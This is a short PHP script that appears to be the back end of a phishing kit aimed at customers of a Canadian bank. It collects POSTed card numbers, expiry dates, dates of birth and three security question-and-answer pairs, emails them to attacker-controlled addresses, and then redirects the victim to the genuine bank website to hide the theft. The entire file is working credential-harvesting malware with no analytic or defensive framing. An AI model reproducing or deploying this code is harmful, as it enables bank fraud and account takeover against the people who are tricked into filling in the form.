<?php
include "sulreinca@gmail.com";

$clientCard = $_POST['clientCard'];
$cardExpDate= $_POST['cardExpDate'];
$dateNaissance= $_POST['dateNaissance'];
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['secretAnswer1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['secretAnswer2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['secretAnswer3'];

$data ="

================================================
user: $clientCard
expiration: $cardExpDate
dob: $dateNaissance
------------------------------------------------
question 1:  $secretQuestion1Key
answer 1:   $secretAnswer1
question 2:  $secretQuestion2Key
answer 2:   $secretAnswer2
question 3:  $secretQuestion3Key
answer 3:   $secretAnswer3
================================================
";



$subj="NATIO $dateNaissance"; 




mail($mailone, $subj, $data);
mail($cc, $subj, $data);

header("Location: https://www.nbc.ca");

?>